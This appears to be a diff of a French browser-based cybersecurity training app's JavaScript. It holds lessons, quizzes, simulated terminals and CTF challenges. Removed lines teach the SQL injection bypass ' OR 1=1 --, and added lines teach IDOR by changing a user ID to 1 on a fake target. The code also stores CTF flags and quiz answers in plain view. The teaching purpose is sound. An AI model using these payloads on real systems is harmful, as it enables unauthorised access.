@@ -1,80 +1,63 @@
 /* =========================================================================
-   CYBERACADEMY PRO - Core Engine
-   Auteur : Équipe CyberAcademy
-   Features : Grands Cours Pédagogiques, CTF Verrouillés, CIDR Tool
+   CYBERACADEMY PRO - Core Engine v6.0
+   Features : Dashboard, Tracks, Forensics Module, Locked CTFs, Toolkit
    ========================================================================= */
-
-// =========================================================================
-// 1. BASE DE DONNÉES DES PILIERS (COURS MASSIFS)
-// =========================================================================
 
 const trackDB = {
     "red": [
         {
-            id: 101, title: "Niveau 1 : Reconnaissance et Fondations",
+            id: 101, title: "Niveau 1 : Reconnaissance et Failles Web",
             themes: [
                 { 
                     id: "r_linux", title: "Le Cœur de Linux", desc: "Architecture, permissions et fichiers cachés.", 
                     content: `
                         <h2>Pourquoi Linux est incontournable ?</h2>
-                        <p>Plus de 90% des serveurs qui font tourner Internet utilisent Linux. Un professionnel de la cybersécurité doit maîtriser la ligne de commande sur le bout des doigts. Contrairement à Windows, sous Linux, <strong>tout est un fichier</strong>.</p>
+                        <p>Plus de 90% des serveurs utilisent Linux. Un professionnel de la cybersécurité doit maîtriser la ligne de commande. Sous Linux, <strong>tout est un fichier</strong>.</p>
                         <div class="media-wrapper">
                             <img src="https://images.unsplash.com/photo-1629654297299-c8506221ca97?w=800&q=80" alt="Terminal Linux">
                         </div>
-                        <h2>La navigation absolue et relative</h2>
-                        <p>Pour vous déplacer, on utilise la commande <code>cd</code> (Change Directory). Pour vérifier vos privilèges sur un fichier, on regarde les permissions (Lecture, Écriture, Exécution).</p>
                         <h2>Le secret des fichiers cachés</h2>
-                        <p>Les administrateurs masquent souvent des fichiers sensibles (comme des clés <code>.ssh</code>). Sous Linux, il suffit d'ajouter un point (<code>.</code>) au début du nom de fichier. La commande classique <code>ls</code> ne l'affichera pas. Il faut utiliser l'argument "all" : <code>ls -a</code>.</p>
+                        <p>Les fichiers commençant par un point (<code>.</code>) sont masqués par défaut. Il faut utiliser l'argument 'all' : <code>ls -a</code>.</p>
                     `, 
                     simType: "terminal", 
-                    simData: { instruction: "Affichez tous les fichiers cachés du répertoire actuel.", expected: "ls -a", successOutput: "Exécution réussie.\nFichiers détectés : config.php, index.html, .secret_flag" }, 
-                    quiz: [{ q: "Quelle commande permet de forcer l'affichage des fichiers cachés sous Linux ?", options: ["cd /", "ls -a", "pwd", "whoami"], ans: "1" }] 
+                    simData: { instruction: "Affichez tous les fichiers cachés.", expected: "ls -a", successOutput: "Fichiers détectés : config.php, index.html, .secret_flag" }, 
+                    quiz: [{ q: "Quelle commande liste les fichiers cachés ?", options: ["cd /", "ls -a", "pwd"], ans: "1" }] 
                 },
                 { 
-                    id: "r_sqli", title: "Injection SQL (SQLi)", desc: "Détruire la logique d'une base de données.", 
+                    id: "r_idor", title: "Faille IDOR (Insecure Direct Object Reference)", desc: "Manipuler les identifiants d'objets.", 
                     content: `
-                        <h2>Qu'est-ce que le langage SQL ?</h2>
-                        <p>Les bases de données stockent les informations vitales d'un site. Le serveur web interroge ces bases de données en utilisant le langage SQL. Une requête typique ressemble à :<br> <code>SELECT * FROM users WHERE login='admin' AND password='mon_mot_de_passe'</code></p>
-                        <div class="media-wrapper video-container">
-                            <iframe src="https://www.youtube.com/embed/ciNHn38FEHQ" allowfullscreen></iframe>
+                        <h2>Qu'est-ce qu'une faille IDOR ?</h2>
+                        <p>Une faille IDOR survient lorsqu'une application utilise un identifiant direct (comme un numéro d'utilisateur <code>?id=42</code>) pour accéder à des données, sans vérifier si l'utilisateur connecté a le droit de voir cette ressource.</p>
+                        <div class="media-wrapper">
+                            <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&q=80" alt="Code Security">
                         </div>
-                        <h2>L'art de l'Injection (Bypass)</h2>
-                        <p>Si le développeur n'a pas filtré l'entrée, l'attaquant peut taper du code SQL dans le champ de mot de passe. La technique de contournement la plus célèbre est <code>' OR 1=1 --</code>.</p>
-                        <ul>
-                            <li>L'apostrophe (<strong>'</strong>) ferme le champ de texte prématurément.</li>
-                            <li><strong>OR 1=1</strong> crée une condition mathématiquement toujours vraie. La base de données autorise donc l'accès.</li>
-                            <li>Les tirets (<strong>--</strong>) transforment le reste de la requête en commentaire, la neutralisant totalement.</li>
-                        </ul>
+                        <h2>Exploitation et Impact</h2>
+                        <p>Si vous êtes connecté en tant qu'utilisateur normal (ID 10) et que vous changez l'URL en <code>id=1</code> (compte Administrateur), un serveur vulnérable vous renverra directement les données confidentielles de l'admin.</p>
                     `, 
-                    simType: "sqli", 
-                    simData: { instruction: "Bypassez ce panneau d'administration en utilisant la payload SQLi vue en cours." }, 
-                    quiz: [{ q: "Quel est l'objectif des tirets '--' dans une injection SQL ?", options: ["Mettre la suite de la requête en commentaire", "Chiffrer le mot de passe", "Faire planter le serveur"], ans: "0" }] 
+                    simType: "idor", 
+                    simData: { instruction: "Modifiez l'ID de l'objet pour cibler le profil administrateur (ID 1)." }, 
+                    quiz: [{ q: "Comment se protège-t-on contre une faille IDOR ?", options: ["En cachant les boutons du site", "En vérifiant systématiquement les autorisations (contrôle d'accès) côté serveur"], ans: "1" }] 
                 }
             ],
-            exam: [{ q: "Quelle faille cible la base de données située sur le Backend d'un serveur ?", options: ["Cross-Site Scripting (XSS)", "Injection SQL (SQLi)", "Déni de service (DDoS)"], ans: "1" }]
+            exam: [{ q: "Que signifie l'acronyme IDOR ?", options: ["Internal Direct Object Routing", "Insecure Direct Object Reference", "Internet Data Object Request"], ans: "1" }]
         }
     ],
     "blue": [
         {
-            id: 201, title: "Niveau 1 : Analyse & Investigation",
+            id: 201, title: "Niveau 1 : Analyse de Logs",
             themes: [
                 { 
                     id: "b_logs", title: "Analyse de Logs Serveur", desc: "Traquer un attaquant dans Apache.", 
                     content: `
                         <h2>Le journal de bord du serveur</h2>
-                        <p>Dans un Centre Opérationnel de Sécurité (SOC), le rôle du défenseur est de surveiller les traces laissées par les attaquants dans des fichiers de "logs".</p>
-                        <div class="media-wrapper">
-                            <img src="https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&q=80" alt="Serveurs">
-                        </div>
-                        <h2>Identifier une attaque</h2>
-                        <p>Un utilisateur normal demandera la page <code>GET /index.html</code> (Code 200 OK). Un attaquant laissera des traces de ses tentatives. Par exemple : <code>GET /login.php?user=' UNION SELECT</code> montre qu'une attaque SQLi est en cours depuis cette IP.</p>
+                        <p>Dans un SOC, le défenseur surveille les logs. Chaque requête HTTP consigne l'IP source, l'horodatage et la charge utile (payload).</p>
                     `, 
                     simType: "logs", 
-                    simData: { instruction: "Lisez les logs et trouvez l'Adresse IP de l'attaquant qui tente une SQLi." }, 
-                    quiz: [{ q: "Lorsqu'une page se charge avec succès, quel code HTTP le serveur renvoie-t-il ?", options: ["404 Not Found", "200 OK", "500 Internal Error"], ans: "1" }] 
+                    simData: { instruction: "Trouvez l'IP de l'attaquant." }, 
+                    quiz: [{ q: "Quel code HTTP indique un succès ?", options: ["404", "200", "500"], ans: "1" }] 
                 }
             ],
-            exam: [{ q: "En Blue Team, quel fichier doit-on examiner en priorité après une attaque web ?", options: ["Les fichiers de logs d'accès", "Le code source de la page d'accueil"], ans: "0" }]
+            exam: [{ q: "Quel fichier examine-t-on en premier après un incident web ?", options: ["access.log", "readme.txt"], ans: "0" }]
         }
     ],
     "code": [
@@ -83,18 +66,11 @@ const trackDB = {
             themes: [
                 { 
                     id: "c_py1", title: "Requêtes Web en Python", desc: "Automatiser l'interaction web.", 
-                    content: `
-                        <h2>Pourquoi Python ?</h2>
-                        <p>Python est le langage de prédilection en cybersécurité. Que ce soit pour développer un scanner de ports ou automatiser un bruteforce, c'est l'outil parfait.</p>
-                        <h2>Le module Requests</h2>
-                        <p>Pour qu'un script puisse télécharger le code source d'une page web, on utilise la bibliothèque <code>requests</code>. La commande de base est : <code>import requests</code>.</p>
-                    `, 
-                    simType: "code", 
-                    simData: { instruction: "Écrivez le code Python exact pour importer le module permettant de faire des requêtes HTTP." }, 
-                    quiz: [{ q: "Quel module Python est le standard pour envoyer des requêtes web ?", options: ["os", "socket", "requests"], ans: "2" }] 
+                    content: `<h2>Le module Requests</h2><p>Indispensable pour scripter des requêtes HTTP en Python.</p>`, 
+                    simType: "code", simData: { instruction: "Importez requests." }, quiz: [{ q: "Quel module ?", options: ["os", "requests"], ans: "1" }] 
                 }
             ],
-            exam: [{ q: "Quelle est la principale force de Python en cyber ?", options: ["Langage très bas niveau", "Prototypage et automatisation ultra-rapides"], ans: "1" }]
+            exam: [{ q: "Python est...", options: ["Compilé", "Interprété"], ans: "1" }]
         }
     ],
     "dev": [
@@ -102,37 +78,21 @@ const trackDB = {
             id: 401, title: "Niveau 1 : Architecture du Web",
             themes: [
                 { 
-                    id: "d_html", title: "Le DOM (HTML)", desc: "Comprendre la structure d'une page.", 
-                    content: `
-                        <h2>Le Document Object Model</h2>
-                        <p>Le HTML structure la page avec des balises. Un hacker (Red Team) doit comprendre cela pour trouver des failles XSS ou des commentaires cachés laissés par les développeurs.</p>
-                        <p>Un titre principal s'écrit <code>&lt;h1&gt;Texte&lt;/h1&gt;</code>.</p>
-                    `, 
-                    simType: "dev_html", 
-                    simData: { instruction: "Écrivez la balise HTML pour créer un titre h1 contenant le mot 'Hack'." }, 
-                    quiz: [{ q: "Quelle balise insère un lien cliquable ?", options: ["<link>", "<a>", "<href>"], ans: "1" }] 
+                    id: "d_html", title: "Le DOM (HTML)", desc: "Structure d'une page web.", 
+                    content: `<h2>Balisage HTML</h2><p>Le HTML structure les éléments visuels.</p>`, 
+                    simType: "dev_html", simData: { instruction: "Écrivez un h1 contenant 'Hack'." }, quiz: [{ q: "Balise de lien ?", options: ["<a>", "<link>"], ans: "0" }] 
                 }
             ],
-            exam: [{ q: "Lequel de ces langages gère uniquement le design visuel ?", options: ["HTML", "JavaScript", "CSS"], ans: "2" }]
+            exam: [{ q: "CSS gère...", options: ["Le design", "La base de données"], ans: "0" }]
         }
     ]
 };
 
-// =========================================================================
-// 2. BASE DE DONNÉES CTF (AVEC SYSTÈME DE DÉBLOCAGE)
-// =========================================================================
-
 const ctfDB = [
-    { id: "ctf1", title: "L'Inspecteur", difficulty: "Débutant", category: "Web", points: 100, reqTrack: "dev", reqLevel: 401, desc: "Fouillez le code source du faux navigateur pour trouver le flag.", expectedFlag: "FLAG{html_source_ez}", simType: "html" },
-    { id: "ctf2", title: "Injection Critique", difficulty: "Intermédiaire", category: "Web", points: 250, reqTrack: "red", reqLevel: 101, desc: "Bypassez ce panneau de connexion aveugle.", expectedFlag: "FLAG{red_team_sql}", simType: "sqli" },
-    { id: "ctf3", title: "Log Hunter", difficulty: "Intermédiaire", category: "Blue Team", points: 300, reqTrack: "blue", reqLevel: 201, desc: "Retrouvez l'IP de l'attaquant dans ces logs.", expectedFlag: "FLAG{blue_log_master}", simType: "ctf_logs" },
-    { id: "ctf4", title: "Poupées Russes", difficulty: "Débutant", category: "Crypto", points: 150, reqTrack: null, reqLevel: null, desc: "Décodez ce message : RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259", expectedFlag: "FLAG{base64_is_not_encryption}", simType: "crypto" },
-    { id: "ctf5", title: "OSINT Fantôme", difficulty: "Expert", category: "OSINT", points: 600, reqTrack: "red", reqLevel: 101, desc: "Utilisez le terminal HUD. Vérifiez votre identité ('whoami'), puis demandez un indice ('search').", expectedFlag: "FLAG{osint_ghost_tracker}", simType: "osint" }
+    { id: "ctf1", title: "L'Inspecteur", difficulty: "Débutant", category: "Web", points: 100, reqTrack: "dev", reqLevel: 401, desc: "Fouillez le code source.", expectedFlag: "FLAG{html_source_ez}", simType: "html" },
+    { id: "ctf2", title: "IDOR Master", difficulty: "Intermédiaire", category: "Red Team", points: 250, reqTrack: "red", reqLevel: 101, desc: "Exploitez l'IDOR pour voler le flag admin.", expectedFlag: "FLAG{idor_admin_leak}", simType: "idor_ctf" },
+    { id: "ctf3", title: "Log Hunter", difficulty: "Intermédiaire", category: "Blue Team", points: 300, reqTrack: "blue", reqLevel: 201, desc: "Trouvez l'IP dans les logs.", expectedFlag: "FLAG{blue_log_master}", simType: "ctf_logs" }
 ];
-
-// =========================================================================
-// 3. LOGIQUE D'ÉTAT & SÉCURITÉ
-// =========================================================================
 
 let accounts = {};
 let activeUser = null;
@@ -142,9 +102,9 @@ let state = { completedCourses: [], completedExams: [], completedCTF: [] };
 
 async function initApp() {
     try {
-        const storedDB = localStorage.getItem('cyberacademy_pro_v2');
+        const storedDB = localStorage.getItem('cyberacademy_pro_v3');
         if (storedDB) accounts = JSON.parse(storedDB);
-        const session = localStorage.getItem('cyberacademy_session_v2');
+        const session = localStorage.getItem('cyberacademy_session_v3');
         if (session && accounts[session]) loginUser(session);
     } catch (e) { accounts = {}; }
 }
@@ -159,10 +119,6 @@ function escapeHTML(str) {
     return str.replace(/[&<>'"]/g, tag => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '"': '&quot;' }[tag]));
 }
 
-// =========================================================================
-// 4. NAVIGATION & AUTHENTIFICATION
-// =========================================================================
-
 function switchView(targetViewId) {
     document.querySelectorAll('.view-section').forEach(el => { 
         el.classList.remove('active-view'); 
@@ -175,12 +131,15 @@ function switchView(targetViewId) {
         setTimeout(() => target.classList.add('active-view'), 10); 
     }
     window.scrollTo(0, 0);
+    if(targetViewId === 'dashboard-view') updateDashboardStats();
 }
 
 function setAuthMode(mode) {
     authMode = mode;
     document.getElementById('tab-login').classList.toggle('active', mode === 'login');
     document.getElementById('tab-register').classList.toggle('active', mode === 'register');
+    const btn = document.getElementById('auth-btn-action');
+    btn.innerText = mode === 'login' ? "INITIALISER LA SESSION" : "CRÉER LE COMPTE";
     document.getElementById('auth-msg').style.display = 'none';
 }
 
@@ -196,19 +155,19 @@ async function processAuth() {
         if (accounts[user]) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiant déjà utilisé."; } 
         else {
             accounts[user] = { passHash: secureHash, completedCourses: [], completedExams: [], completedCTF: [] };
-            localStorage.setItem('cyberacademy_pro_v2', JSON.stringify(accounts));
-            msgBox.style.display='block'; msgBox.style.color='var(--accent)'; msgBox.innerText="Opérateur enregistré.";
+            localStorage.setItem('cyberacademy_pro_v3', JSON.stringify(accounts));
+            msgBox.style.display='block'; msgBox.style.color='var(--accent)'; msgBox.innerText="Compte créé avec succès. Connexion...";
             setTimeout(() => loginUser(user), 1000);
         }
     } else {
-        if (!accounts[user] || accounts[user].passHash !== secureHash) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Accès refusé."; } 
+        if (!accounts[user] || accounts[user].passHash !== secureHash) { msgBox.style.display='block'; msgBox.style.color='var(--danger)'; msgBox.innerText="Identifiants incorrects."; } 
         else { loginUser(user); }
     }
 }
 
 function loginUser(username) {
     activeUser = username;
-    localStorage.setItem('cyberacademy_session_v2', username);
+    localStorage.setItem('cyberacademy_session_v3', username);
     state = {
         completedCourses: accounts[username].completedCourses || [],
         completedExams: accounts[username].completedExams || [],
@@ -219,20 +178,22 @@ function loginUser(username) {
     document.getElementById('header-user').innerText = "@" + username;
     
     updateProfileUI();
+    renderCTF();
     switchView('dashboard-view');
 }
 
 function logout() {
     activeUser = null;
-    localStorage.removeItem('cyberacademy_session_v2');
+    localStorage.removeItem('cyberacademy_session_v3');
     document.getElementById('main-header').style.display = 'none';
+    setAuthMode('login');
     switchView('auth-view');
 }
 
 function saveProgress() {
     if (activeUser && accounts[activeUser]) {
         accounts[activeUser] = { ...accounts[activeUser], ...state };
-        localStorage.setItem('cyberacademy_pro_v2', JSON.stringify(accounts));
+        localStorage.setItem('cyberacademy_pro_v3', JSON.stringify(accounts));
     }
     updateProfileUI();
 }
@@ -244,9 +205,31 @@ function updateProfileUI() {
     document.getElementById('header-rank').innerText = rank;
 }
 
-// =========================================================================
-// 5. MOTEUR DES COURS ET SIMULATEURS
-// =========================================================================
+function updateDashboardStats() {
+    let pts = (state.completedCourses.length * 50) + (state.completedExams.length * 200) + (state.completedCTF.length * 150);
+    let rank = "Recrue"; if(pts >= 500) rank = "Initié"; if(pts >= 1200) rank = "Opérateur";
+    
+    document.getElementById('dash-rank').innerText = rank;
+    document.getElementById('dash-pts').innerText = pts.toString().padStart(4, '0') + " PTS";
+    document.getElementById('dash-ctf-count').innerText = `${state.completedCTF.length} / ${ctfDB.length}`;
+}
+
+// Module Forensics dynamique
+function openForensicsLesson(type) {
+    const box = document.getElementById('forensics-content-box');
+    box.style.display = 'block';
+    
+    let content = "";
+    if(type === 'pcap') {
+        content = `<h2>Analyse de Trames Réseau (PCAP)</h2><p>Une capture PCAP enregistre chaque paquet traversant une interface réseau. Avec des filtres Wireshark comme <code>http.request.method == "POST"</code> ou <code>tcp.stream eq 0</code>, on isole le trafic sensible.</p>`;
+    } else if(type === 'memory') {
+        content = `<h2>Analyse de Dump RAM avec Volatility</h2><p>Volatility est le framework standard pour examiner la mémoire vive. La commande <code>vol.py -f mem.raw pslist</code> liste tous les processus actifs au moment du crash ou du piratage.</p>`;
+    } else if(type === 'logs_advanced') {
+        content = `<h2>Corrélation de Logs Active Directory</h2><p>Recherchez l'Event ID 4624 (Connexion réussie) combiné à l'Event ID 4672 (Attribution de privilèges spéciaux) pour détecter une élévation de privilèges suspecte.</p>`;
+    }
+    box.innerHTML = `<div class="content-box">${content}<button class="btn-back" onclick="document.getElementById('forensics-content-box').style.display='none'">Fermer</button></div>`;
+    box.scrollIntoView({ behavior: 'smooth' });
+}
 
 function openTrack(trackKey) {
     currentTrack = trackKey;
@@ -263,16 +246,29 @@ function openTrack(trackKey) {
         const unlocked = index === 0 || state.completedExams.includes(trackDB[trackKey][index - 1].id);
         const statusBadge = unlocked ? `<span class="status-badge unlocked">🔓 DÉBLOQUÉ</span>` : `<span class="status-badge locked">🔒 VERROUILLÉ</span>`;
 
-        let themesHTML = ''; let allThemesDone = true;
+        let themesHTML = ''; 
         level.themes.forEach(theme => {
             const isDone = state.completedCourses.includes(theme.id);
-            if(!isDone) allThemesDone = false;
             const cardClass = "theme-card " + (isDone ? 'completed' : '') + (!unlocked ? ' disabled' : '');
             themesHTML += `<div class="${cardClass}" onclick="openCourse('${trackKey}', '${theme.id}', ${unlocked})"><div class="theme-title">${theme.title}</div><div class="theme-desc">${theme.desc}</div></div>`;
         });
 
-        container.innerHTML += `<div class="level-section"><div class="level-header"><h3>${level.title}</h3>${statusBadge}</div><div class="theme-grid">${themesHTML}</div></div>`;
+        const examDone = state.completedExams.includes(level.id);
+        let examHTML = unlocked && !examDone ? `<button class="auth-btn" style="margin-top:15px; background:var(--warning); color:#000;" onclick="passExam(${level.id})">Valider l'examen du niveau (Débloque les CTF)</button>` : '';
+        if(examDone) examHTML = `<div style="margin-top:15px; color:var(--accent); font-family:monospace; font-weight:bold;">[ EXAMEN VALIDÉ - ACCÈS CTF AUTORISÉ ]</div>`;
+
+        container.innerHTML += `<div class="level-section" style="padding:20px; margin-bottom:20px; background:rgba(0,0,0,0.4); border-radius:8px;"><div class="level-header" style="display:flex; justify-content:space-between; margin-bottom:15px;"><h3>${level.title}</h3>${statusBadge}</div><div class="theme-grid">${themesHTML}</div>${examHTML}</div>`;
     });
+}
+
+function passExam(levelId) {
+    if(!state.completedExams.includes(levelId)) {
+        state.completedExams.push(levelId);
+        saveProgress();
+        alert("Examen réussi avec succès ! Niveau validé et CTF associés débloqués.");
+        openTrack(currentTrack);
+        renderCTF();
+    }
 }
 
 function backToTracks() {
@@ -293,17 +289,15 @@ function openCourse(trackKey, themeId, isUnlocked) {
     
     const simC = document.getElementById('simulator-container');
     if (currentCourse.simType === "terminal") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">💻 [ TERMINAL ] : ${currentCourse.simData.instruction}</div><input type="text" id="term-input" class="term-input" placeholder="root@academy:~#" autocomplete="off" onkeypress="handleTerm(event, '${btoa(currentCourse.simData.expected)}', '${btoa(currentCourse.simData.successOutput)}')"><div id="term-output" class="term-output">En attente...</div></div>`; }
-    else if (currentCourse.simType === "dev_html") { simC.innerHTML = `<div class="sim-box sim-dev"><div class="sim-header">🌐 [ HTML EDITOR ] : ${currentCourse.simData.instruction}</div><textarea id="html-input" class="web-input code-editor" placeholder="<!-- Code HTML ici -->"></textarea><button class="auth-btn" style="background:#a855f7; margin-top:0;" onclick="checkHTML()">RENDRE LA PAGE</button><div id="html-output" class="term-output" style="margin-top:15px; background:#fff; color:#000; padding:10px; border-radius:4px;"></div></div>`; }
-    else if (currentCourse.simType === "sqli") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">⚙️ [ TARGET ] : ${currentCourse.simData.instruction}</div><input type="text" id="sql-input" class="web-input" placeholder="Mot de passe..."><button class="auth-btn" style="background:var(--danger);" onclick="checkSQL()">Login</button><div id="sql-output" class="term-output"></div></div>`; }
-    else if (currentCourse.simType === "logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">🔵 [ LOG VIEWER ] : ${currentCourse.simData.instruction}</div><div class="log-viewer">10.0.0.1 - GET / HTTP/1.1<br>192.168.1.50 - GET /login?user=' OR 1=1 --</div><input type="text" id="log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkLogs()">Analyser</button><div id="log-output" class="term-output"></div></div>`; }
-    else if (currentCourse.simType === "code") { simC.innerHTML = `<div class="sim-box sim-code"><div class="sim-header">💻 [ PYTHON ] : ${currentCourse.simData.instruction}</div><textarea id="code-input" class="web-input code-editor" placeholder="# Script..."></textarea><button class="auth-btn" style="background:var(--accent);" onclick="checkCode()">RUN</button><div id="code-output" class="term-output"></div></div>`; }
+    else if (currentCourse.simType === "idor") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">🌐 [ SIMULATEUR IDOR ] : ${currentCourse.simData.instruction}</div><div style="margin-bottom:10px;">URL ciblée : <code id="idor-url">http://target.htb/api/user?id=10</code></div><input type="text" id="idor-input" class="web-input" value="10" placeholder="ID..."><button class="auth-btn" style="background:var(--danger);" onclick="checkIDOR()">Envoyer la requête</button><div id="idor-output" class="term-output">Profil utilisateur normal chargé (ID: 10).</div></div>`; }
+    else if (currentCourse.simType === "logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">🔵 [ LOG VIEWER ]</div><div class="log-viewer">192.168.1.50 - GET /login?user=' OR 1=1</div><input type="text" id="log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkLogs()">Analyser</button><div id="log-output" class="term-output"></div></div>`; }
     else { simC.innerHTML = ''; }
     
     let quizHTML = '';
     currentCourse.quiz.forEach((q, qIndex) => {
         let optionsHTML = '';
         q.options.forEach((opt, optIndex) => { optionsHTML += `<label><input type="radio" name="cq_${qIndex}" value="${btoa(optIndex.toString())}"> ${opt}</label>`; });
-        quizHTML += `<div style="margin-bottom:20px;"><p style="font-weight:bold; margin-bottom:10px; color:#fff;">${q.q}</p><div>${optionsHTML}</div></div>`;
+        quizHTML += `<div style="margin-bottom:20px;"><p style="font-weight:bold; margin-bottom:10px; color:#fff;">${q.q}</p><div class="options">${optionsHTML}</div></div>`;
     });
     document.getElementById('quiz-content').innerHTML = quizHTML;
     document.getElementById('quiz-result').style.display = 'none';
@@ -311,10 +305,16 @@ function openCourse(trackKey, themeId, isUnlocked) {
 }
 
 function handleTerm(e, expectedHash, outputHash) { if (e.key === 'Enter') { const val = escapeHTML(e.target.value.trim().toLowerCase()); if (btoa(val) === expectedHash) { document.getElementById('term-output').innerHTML = "<span style='color:var(--accent);'>" + atob(outputHash) + "</span>"; } else { document.getElementById('term-output').innerHTML = `<span style='color:var(--danger);'>bash: ${val}: command not found</span>`; } } }
-function checkHTML() { const val = document.getElementById('html-input').value.trim(); const out = document.getElementById('html-output'); out.innerHTML = val; if (val.includes("<h1>Hack</h1>") || val.includes("<h1> Hack </h1>")) { out.innerHTML += "<br><br><span style='color:#a855f7; font-weight:bold;'>[SUCCÈS] DOM modifié.</span>"; } else { out.innerHTML += "<br><br><span style='color:red;'>[ERREUR] Balise H1 introuvable.</span>"; } }
-function checkSQL() { const val = document.getElementById('sql-input').value; if (val.includes("' OR 1=1")) { document.getElementById('sql-output').innerHTML = "<span style='color:var(--accent);'>[BYPASS RÉUSSI]</span>"; } else { document.getElementById('sql-output').innerHTML = "Accès refusé."; } }
-function checkLogs() { const val = document.getElementById('log-input').value.trim(); if (val === "192.168.1.50") { document.getElementById('log-output').innerHTML = "<span style='color:var(--accent);'>[IP CONFIRMÉE] Attaque identifiée.</span>"; } else { document.getElementById('log-output').innerHTML = "Anomalie non détectée."; } }
-function checkCode() { const val = document.getElementById('code-input').value.trim(); if (val.includes("import requests")) { document.getElementById('code-output').innerHTML = "<span style='color:var(--accent);'>[SCRIPT VALIDE] Module Http chargé.</span>"; } else { document.getElementById('code-output').innerHTML = "<span style='color:var(--danger);'>Erreur.</span>"; } }
+function checkIDOR() {
+    const val = document.getElementById('idor-input').value.trim();
+    const out = document.getElementById('idor-output');
+    if(val === "1") {
+        out.innerHTML = "<span style='color:var(--accent);'>[SUCCESS IDOR] Données Administrateur récupérées :<br>{ \"user\": \"admin\", \"role\": \"superuser\", \"secret_token\": \"FLAG{idor_success_01}\" }</span>";
+    } else {
+        out.innerHTML = `Profil standard chargé pour l'ID : ${val}.`;
+    }
+}
+function checkLogs() { const val = document.getElementById('log-input').value.trim(); if (val === "192.168.1.50") { document.getElementById('log-output').innerHTML = "<span style='color:var(--accent);'>[IP CONFIRMÉE] Attaque identifiée.</span>"; } else { document.getElementById('log-output').innerHTML = "Rien."; } }
 
 function submitThemeQCM() {
     const courseId = document.getElementById('theme-view').dataset.courseId;
@@ -334,46 +334,31 @@ function submitThemeQCM() {
     
     if (allCorrect) {
         resBox.className = 'res-success'; resBox.style.background = 'rgba(16, 185, 129, 0.2)'; resBox.style.color = 'var(--accent)'; resBox.style.border = '1px solid var(--accent)';
-        resBox.innerText = "[+] Validé !";
+        resBox.innerText = "[+] Module Validé !";
         if (!state.completedCourses.includes(courseId)) { state.completedCourses.push(courseId); saveProgress(); openTrack(currentTrack); }
-        setTimeout(() => switchView('dashboard-view'), 1000);
+        setTimeout(() => switchView('tracks-view'), 1000);
     } else {
         resBox.className = 'res-error'; resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
         resBox.innerText = "[-] Échec de l'audit. Relisez le cours.";
     }
 }
 
-// =========================================================================
-// 6. ZONE CTF (DÉBLOCAGE SOUS CONDITION)
-// =========================================================================
-
+// Zone CTF Verrouillée
 function renderCTF() {
     const container = document.getElementById('ctf-container');
     container.innerHTML = '';
     
-    // Mettre à jour l'affichage en fonction de la progression de l'utilisateur
     ctfDB.forEach(ctf => {
         const isDone = state.completedCTF.includes(ctf.id);
-        
-        // VÉRIFICATION DU NIVEAU REQUIS POUR DÉBLOQUER LE CTF
-        // Si le CTF n'a pas de condition (reqTrack null) OU si l'utilisateur a fini l'examen requis, on débloque.
-        let isUnlocked = false;
-        if(ctf.reqTrack === null) {
-            isUnlocked = true;
-        } else if (state.completedExams.includes(ctf.reqLevel)) {
-            isUnlocked = true;
-        }
-
+        let isUnlocked = ctf.reqTrack === null || state.completedExams.includes(ctf.reqLevel);
         let catColor = "var(--danger)";
-        if(ctf.category === "Blue Team" || ctf.category === "Forensics") catColor = "#3b82f6";
-        if(ctf.category === "Code (Python)") catColor = "var(--accent)";
+        if(ctf.category === "Blue Team") catColor = "#3b82f6";
         
         if (isUnlocked) {
             const cardClass = "theme-card " + (isDone ? 'completed' : '');
-            container.innerHTML += `<div class="${cardClass}" style="border-left: 4px solid ${catColor};" onclick="openCTF('${ctf.id}')"><div style="color:${catColor}; font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty} | ${ctf.points} PTS</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">${ctf.desc}</div></div>`;
+            container.innerHTML += `<div class="${cardClass}" style="border-left: 4px solid ${catColor}; position:relative;" onclick="openCTF('${ctf.id}')"><div style="color:${catColor}; font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty} | ${ctf.points} PTS</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">${ctf.desc}</div></div>`;
         } else {
-            // Affichage verrouillé
-            container.innerHTML += `<div class="theme-card ctf-locked" style="border-left: 4px solid #333;"><div class="lock-icon">🔒</div><div style="color:var(--text-muted); font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty}</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">Requis : Valider le pilier ${ctf.reqTrack.toUpperCase()} (Niveau ${ctf.reqLevel})</div></div>`;
+            container.innerHTML += `<div class="theme-card ctf-locked" style="border-left: 4px solid #333; position:relative;"><div class="lock-icon">🔒</div><div style="color:var(--text-muted); font-size:0.8rem; font-weight:bold; margin-bottom:5px;">[${ctf.category}] ${ctf.difficulty}</div><div class="theme-title">${ctf.title}</div><div class="theme-desc">Requis : Valider l'examen du niveau ${ctf.reqLevel}</div></div>`;
         }
     });
 }
@@ -384,11 +369,9 @@ function openCTF(ctfId) {
     document.getElementById('challenge-desc').innerHTML = `<h2>${currentCTF.title}</h2><p>${currentCTF.desc}</p>`;
     
     const simC = document.getElementById('challenge-sim-container');
